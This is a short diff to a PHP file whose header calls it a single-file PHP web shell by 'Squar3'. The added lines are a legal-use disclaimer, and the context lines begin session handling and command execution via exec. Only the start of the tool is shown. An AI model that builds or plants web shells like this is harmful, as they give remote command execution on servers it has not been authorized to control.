@@ -1,4 +1,13 @@
 <?php
+
+#   Single-file php shell made by Squar3
+
+#    This tool can only be used for legal purposes. You take full responsibility for any actions performed using this.
+#    The owner of the tool is not responsible for the damage caused by it.
+#    DON'T USE IT WITHOUT PERMESSIONS
+
+
+
 session_start();
 if ($_SESSION['location'] === null) {
     $location = exec("pwd");
